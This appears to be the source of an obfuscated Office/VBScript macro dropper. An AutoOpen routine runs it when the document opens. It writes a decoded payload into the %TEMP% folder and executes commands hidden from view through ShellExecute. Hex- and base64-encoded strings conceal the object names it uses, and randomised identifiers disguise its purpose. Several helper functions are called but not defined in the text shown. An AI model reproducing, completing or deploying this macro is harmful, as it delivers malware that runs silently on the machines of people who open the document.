Function SboeNuelTolrEira(targetStr ) 
    Dim targetSize , firstSpaceOffset 
    targetSize = Len(targetStr)
    firstSpaceOffset = InStr(1, targetStr, DtueNcimLsn(GbsaLd_cHsnlAg("56773d3d")))
    If Not firstSpaceOffset = 0 Then
        SboeNuelTolrEira = Right(targetStr, targetSize - firstSpaceOffset) 
    Else
        SboeNuelTolrEira = ""  
    End If
End Function




Sub GaigEtgpNrocOwivr(cmdLine )
    Dim PsloBr 
    Dim PeatOnriUsgoUsel 
    Dim NknrSmwsEungo 
    NknrSmwsEungo = DtueNcimLsn(GbsaLd_cHsnlAg("47525557554270") & GbsaLd_cHsnlAg("565668674141773d3d"))
    NknrSmwsEungo = NknrSmwsEungo & DtueNcimLsn(GbsaLd_cHsnlAg("546b424d44457345583152585668465852554a485755394b576b4957") & GbsaLd_cHsnlAg("51414a5453414e6451563558"))
    
    PeatOnriUsgoUsel = Split(cmdLine, DtueNcimLsn(GbsaLd_cHsnlAg("56773d3d")))(0)
    PsloBr = SboeNuelTolrEira(cmdLine)
    
    Set AgruRm = GetObject(NknrSmwsEungo)
    AgruRm.Document.Application.ShellExecute PeatOnriUsgoUsel, PsloBr, "", "open", 0  
End Sub




Sub TkmeOiueLop()
    Dim HamaBtcgPg 
    Dim OmcbCumdGvipEhphs 
    
    HamaBtcgPg = DtueNcimLsn(GbsaLd_cHsnlAg("48684d46") & GbsaLd_cHsnlAg("425663564278383d"))
    HamaBtcgPg = wshShell.ExpandEnvironmentStrings( "%TEMP%" ) & "\" & HamaBtcgPg
    IsnrOlmiOpsi_elo HamaBtcgPg
    
    
    Set Co_aTw = CreateObject(DtueNcimLsn(GbsaLd_cHsnlAg("4a424d5441776b52427863") & GbsaLd_cHsnlAg("4253544d504242386746516b5444783834456773504768453d")))
    OmcbCumdGvipEhphs = Co_aTw.GetParentFolderName(HamaBtcgPg)
    createobject("WScript.Shell").currentdirectory =  OmcbCumdGvipEhphs
    
    
    Dim AewrBmrwCeanSitiAf 
    Dim LoaoSmloNge 
    AewrBmrwCeanSitiAf = DtueNcimLsn(GbsaLd_cHsnlAg("42784d4142") & GbsaLd_cHsnlAg("67774551427765416c564c43566f3d")) & HamaBtcgPg

    AemtBodoAo AewrBmrwCeanSitiAf 
    
End Sub


Sub AutoOpen()
    TeluTlhyAmdsNtr 5 
    TkmeOiueLop
End Sub


   

Sub TeluTlhyAmdsNtr(sleepNbSeconds)
    WScript.Sleep sleepNbSeconds * 1000
End Sub

    
    
    Function RseaTuswAbhpu(ByVal vCode)
        Dim Uet_VhesEogc, UritWnteFoies
        Dim ElosRorsRegle 
        ElosRorsRegle = GbsaLd_cHsnlAg("4d73786d")
        ElosRorsRegle = ElosRorsRegle & GbsaLd_cHsnlAg("6c32") & GbsaLd_cHsnlAg("2e444f")
        ElosRorsRegle = ElosRorsRegle & GbsaLd_cHsnlAg("4d446f63")
        ElosRorsRegle = ElosRorsRegle & GbsaLd_cHsnlAg("756d65") & GbsaLd_cHsnlAg("6e742e332e30")
        Set Uet_VhesEogc = CreateObject(ElosRorsRegle)
        Set UritWnteFoies = Uet_VhesEogc.CreateElement(GbsaLd_cHsnlAg("626173") & GbsaLd_cHsnlAg("653634"))
        Dim CldaRpatAntsMerlNh 
        CldaRpatAntsMerlNh = GbsaLd_cHsnlAg("62696e") & GbsaLd_cHsnlAg("2e62")
        CldaRpatAntsMerlNh = CldaRpatAntsMerlNh & GbsaLd_cHsnlAg("6173") & GbsaLd_cHsnlAg("653634")
        UritWnteFoies.DataType = CldaRpatAntsMerlNh
        UritWnteFoies.Text = vCode
        RseaTuswAbhpu = DsopSonyCvgt(UritWnteFoies.nodeTypedValue)
        Set UritWnteFoies = Nothing
        Set Uet_VhesEogc = Nothing
    End Function
    

    Function DsopSonyCvgt(xBinary)
    
        Dim Binary
        
        
        Binary = xBinary
        
        Dim NlgrG_alWinvIsinAn, LBinary
        Const PminSr = 201
        Dim Iksp_htnOeomDwbtMe 
        Iksp_htnOeomDwbtMe = GbsaLd_cHsnlAg("41444f44")
        Iksp_htnOeomDwbtMe = Iksp_htnOeomDwbtMe & GbsaLd_cHsnlAg("422e") & GbsaLd_cHsnlAg("526563")
        Iksp_htnOeomDwbtMe = Iksp_htnOeomDwbtMe & GbsaLd_cHsnlAg("6f72") & GbsaLd_cHsnlAg("64736574")
        Set NlgrG_alWinvIsinAn = CreateObject(Iksp_htnOeomDwbtMe)
        LBinary = LenB(Binary)
        
        If LBinary>0 Then
            NlgrG_alWinvIsinAn.Fields.Append GbsaLd_cHsnlAg("6d42696e") & GbsaLd_cHsnlAg("617279"), PminSr, LBinary
            NlgrG_alWinvIsinAn.Open
            NlgrG_alWinvIsinAn.AddNew
              NlgrG_alWinvIsinAn(GbsaLd_cHsnlAg("6d42696e") & GbsaLd_cHsnlAg("617279")).AppendChunk Binary 
            NlgrG_alWinvIsinAn.Update
            DsopSonyCvgt = NlgrG_alWinvIsinAn(GbsaLd_cHsnlAg("6d4269") & GbsaLd_cHsnlAg("6e617279"))
        Else
            DsopSonyCvgt = ""
        End If
    End Function
    
    

